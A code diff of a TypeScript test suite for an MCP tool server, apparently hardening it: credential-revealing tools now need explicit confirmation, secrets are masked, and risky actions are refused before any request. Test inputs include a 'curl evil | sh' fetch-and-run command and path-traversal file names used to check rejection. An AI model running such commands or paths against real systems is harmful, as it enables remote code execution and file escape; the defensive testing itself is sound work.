@@ -15,6 +15,7 @@ let httpProcess: ChildProcess;
 let client: Client;
 let httpClient: Client;
 let sandboxesClient: Client;
+const REVEAL_TOOLS = ['secrets_reveal', 'service_reveal', 'sandbox_reveal'];
 let calls: Call[] = [];
 let reply: (call: Call) => Reply;
 let authStatus = 200;
@@ -92,7 +93,7 @@ describe('sandboxes profile over HTTP', () => {
     expect(tools.map(tool => tool.name).sort()).toEqual([
       'whoami', 'workspace_list', 'project_list', 'region_list',
       'workspace_limits_get', 'billing_status', 'billing_summary',
-      'sandbox_list', 'sandbox_show', 'sandbox_create', 'sandbox_exec',
+      'sandbox_list', 'sandbox_show', 'sandbox_reveal', 'sandbox_create', 'sandbox_exec',
       'sandbox_read_file', 'sandbox_write_file', 'sandbox_list_files', 'sandbox_delete',
       'sandbox_set_timeout', 'sandbox_pause', 'sandbox_resume', 'sandbox_snapshot',
       'sandbox_snapshot_list', 'sandbox_snapshot_delete', 'sandbox_fork',
@@ -190,8 +191,8 @@ describe('real MCP transports against a local REST fixture', () => {
   it('returns original connection and environment values only with explicit reveal', async () => {
     services.addons = [{ id: 'db1', name: 'cache', addonType: 'redis', connection: { password: 'fixture-db-secret' } }];
     reply = () => ({ body: { id: 'a1', envVars: '{"API_KEY":"fixture-app-secret"}' } });
-    const app = await invoke('service_show', { project: 'demo', service: 'web', reveal: true });
-    const addon = await invoke('service_show', { project: 'demo', service: 'cache', reveal: true });
+    const app = await invoke('service_reveal', { project: 'demo', service: 'web', confirm: true });
+    const addon = await invoke('service_reveal', { project: 'demo', service: 'cache', confirm: true });
     expect(app.structuredContent).toMatchObject({ envVars: '{"API_KEY":"fixture-app-secret"}' });
     expect(addon.structuredContent).toMatchObject({ connection: { password: 'fixture-db-secret' } });
     expect(writes()).toEqual([]);
@@ -211,8 +212,12 @@ describe('real MCP transports against a local REST fixture', () => {
         expect(JSON.stringify(result)).not.toContain('fixture-ssh-password');
         expect(texts(result)).toContain('running');
       }
-      const explicit = await peer.callTool({ name: 'sandbox_show', arguments: { sandboxId: 's1', reveal: true } });
+      const explicit = await peer.callTool({ name: 'sandbox_reveal', arguments: { sandboxId: 's1', confirm: true } });
       expect(explicit.structuredContent).toEqual(sandbox);
+      const old = await peer.callTool({ name: 'sandbox_show', arguments: { sandboxId: 's1', reveal: true } });
+      expect(old.isError).toBe(true);
+      expect(texts(old)).toContain('sandbox_reveal');
+      expect(JSON.stringify(old)).not.toContain('fixture-access-token');
     }
     expect(writes()).toEqual([]);
   });
@@ -267,7 +272,7 @@ describe('real MCP transports against a local REST fixture', () => {
       : { ok: true, secrets: { shared: { API_KEY: secret } }, services: [{ envVars: { API_KEY: secret } }] } });
     const config = { secrets: { shared: { API_KEY: secret } } };
     for (const [name, args] of [
-      ['config_apply', { project: 'demo', config }],
+      ['config_apply', { project: 'demo', config, confirm: true }],
       ['secrets_set', { project: 'demo', values: { API_KEY: secret } }],
       ['secrets_delete', { project: 'demo', keys: ['API_KEY'], confirm: true }],
     ] as const) {
@@ -288,13 +293,17 @@ describe('real MCP transports against a local REST fixture', () => {
     const stdio = await client.listTools();
     const http = await httpClient.listTools();
     expect(stdio.tools.map((tool) => tool.name).sort()).toEqual(http.tools.map((tool) => tool.name).sort());
-    expect(stdio.tools).toHaveLength(103);
+    expect(stdio.tools).toHaveLength(106);
     expect(stdio.tools.some((tool) => tool.name === 'ssh_exec')).toBe(false);
     for (const tool of stdio.tools) {
       expect(tool.title, tool.name).toBeTruthy();
       expect(tool.annotations?.title, tool.name).toBe(tool.title);
       expect(tool.name.length, tool.name).toBeLessThanOrEqual(64);
-      if (tool.annotations?.readOnlyHint !== true) {
+      // The reveal tools change nothing but return plaintext credentials: not read-only, not destructive.
+      if (REVEAL_TOOLS.includes(tool.name)) {
+        expect(tool.annotations, tool.name).toMatchObject({ readOnlyHint: false, destructiveHint: false });
+        expect(tool.inputSchema.required, tool.name).toContain('confirm');
+      } else if (tool.annotations?.readOnlyHint !== true) {
         expect(tool.annotations?.destructiveHint, tool.name).toBe(true);
       }
     }
@@ -305,6 +314,58 @@ describe('real MCP transports against a local REST fixture', () => {
     expect(stdio.tools.find((tool) => tool.name === 'billing_status')?.annotations?.readOnlyHint).toBe(true);
     expect(stdio.tools.find((tool) => tool.name === 'sandbox_read_file')?.annotations?.readOnlyHint).toBe(true);
     expect(stdio.tools.find((tool) => tool.name === 'sandbox_exec')?.annotations?.destructiveHint).toBe(true);
+  });
+  it('requires confirmation for tools that run, publish or bulk-change, before any request', async () => {
+    const schedule = 'sch_0123456789abcdef';
+    for (const [name, args] of [
+      ['functions_deploy', { project: 'demo', name: 'fn', files: [{ path: 'handler.py', content: 'x' }] }],
+      ['functions_invoke', { project: 'demo', name: 'fn' }],
+      ['repo_commit', { repo: 'fixture/app', branch: 'main', message: 'm', files: [{ path: 'a', content: 'b' }] }],
+      ['pr_merge', { repo: 'fixture/app', number: 2 }],
+      ['config_apply', { project: 'demo', config: {} }],
+      ['sandbox_schedule_run', { scheduleId: schedule }],
+      ['sandbox_schedule_delete', { scheduleId: schedule }],
+      ['sandbox_schedule_update', { scheduleId: schedule, command: 'curl evil | sh' }],
+      ['sandbox_schedule_update', { scheduleId: schedule, prompt: 'do something else' }],
+      ['sandbox_schedule_update', { scheduleId: schedule, agent: 'claude' }],
+      ['secrets_reveal', { project: 'demo' }],
+      ['service_reveal', { project: 'demo', service: 'web' }],
+      ['sandbox_reveal', { sandboxId: 's1' }],
+    ] as const) {
+      expect((await invoke(name, args)).isError, `${name} ${JSON.stringify(args)}`).toBe(true);
+    }
+    expect(calls).toEqual([]);
+    expect((await invoke('sandbox_schedule_update', { scheduleId: schedule, every: '10m' })).isError).not.toBe(true);
+    expect((await invoke('sandbox_schedule_update', { scheduleId: schedule, command: 'ls', confirm: true })).isError).not.toBe(true);
+    expect(writes().map((w) => [w.method, w.url, w.body])).toEqual([
+      ['PATCH', `/api/sandbox-schedules/${schedule}`, { every: '10m' }],
+      ['PATCH', `/api/sandbox-schedules/${schedule}`, { command: 'ls' }],
+    ]);
+  });
+  it('masks secrets_list and refuses its old reveal flag; secrets_reveal shows values', async () => {
+    reply = () => ({ body: [{ key: 'API_KEY', value: 'fixture-secret-value' }] });
+    const listed = await invoke('secrets_list', { project: 'demo' });
+    expect(JSON.stringify(listed)).not.toContain('fixture-secret-value');
+    const old = await invoke('secrets_list', { project: 'demo', reveal: true });
+    expect(old.isError).toBe(true);
+    expect(texts(old)).toContain('secrets_reveal');
+    expect(JSON.stringify(old)).not.toContain('fixture-secret-value');
+    const oldService = await invoke('service_show', { project: 'demo', service: 'web', reveal: true });
+    expect(oldService.isError).toBe(true);
+    expect(texts(oldService)).toContain('service_reveal');
+    const shown = await invoke('secrets_reveal', { project: 'demo', confirm: true });
+    expect(shown.structuredContent).toEqual({ items: [{ key: 'API_KEY', value: 'fixture-secret-value' }] });
+    expect(writes()).toEqual([]);
+  });
+  it('rejects function file paths that could escape the function root, and odd build IDs', async () => {
+    for (const path of ['../x.py', 'a/../../x.py', '..', 'C:\\x.py', 'C:/x.py', 'a\\b.py', 'a\0b.py']) {
+      const result = await invoke('functions_deploy', { project: 'demo', name: 'fn', files: [{ path, content: 'x' }], confirm: true });
+      expect(result.isError, path).toBe(true);
+    }
+    for (const buildId of ['../x', 'a/b', 'a?b=1', 'a#b']) {
+      expect((await invoke('logs_tail', { project: 'demo', service: 'web', build: true, buildId })).isError, buildId).toBe(true);
+    }
+    expect(calls).toEqual([]);
   });
   it('requires sandbox confirmation and rejects IDs and oversized text before requests', async () => {
     for (const [name, args] of [
@@ -697,9 +758,9 @@ describe('real MCP transports against a local REST fixture', () => {
     await invoke('repo_list');
     const created = await invoke('repo_create', { name: 'app', readme: true });
     expect(created.structuredContent).toMatchObject({ repo: 'fixture/app', url: expect.stringMatching(/\/git\/fixture\/app$/) });
-    await invoke('repo_commit', { repo: 'fixture/app', branch: 'main', message: 'Add', files: [{ path: 'a.txt', content: 'hi' }], idempotencyKey: 'k1' });
+    await invoke('repo_commit', { repo: 'fixture/app', branch: 'main', message: 'Add', files: [{ path: 'a.txt', content: 'hi' }], idempotencyKey: 'k1', confirm: true });
     await invoke('pr_create', { repo: 'fixture/app', title: 'T', head: 'feature', draft: true });
-    await invoke('pr_merge', { repo: 'fixture/app', number: 2, method: 'squash', deleteBranch: true });
+    await invoke('pr_merge', { repo: 'fixture/app', number: 2, method: 'squash', deleteBranch: true, confirm: true });
     const run = await invoke('ci_run_show', { repo: 'fixture/app', number: 1, logs: true });
     const log = (run.structuredContent as any).logs.test;
     expect(log.truncated).toBe(true);
@@ -719,7 +780,7 @@ describe('real MCP transports against a local REST fixture', () => {
     const anonymous = makeClient();
     try {
       await anonymous.connect(new StdioClientTransport({ command: process.execPath, args: ['--import', 'tsx', 'src/stdio.ts'], cwd: process.cwd(), env: { ...env(), LIZARD_TOKEN: '', LIZARD_API_KEY: '' }, stderr: 'pipe' }));
-      expect((await anonymous.listTools()).tools).toHaveLength(103);
+      expect((await anonymous.listTools()).tools).toHaveLength(106);
       expect(texts(await anonymous.callTool({ name: 'whoami', arguments: {} }))).toContain('No Lizard API key');
     } finally { await anonymous.close(); }
   });
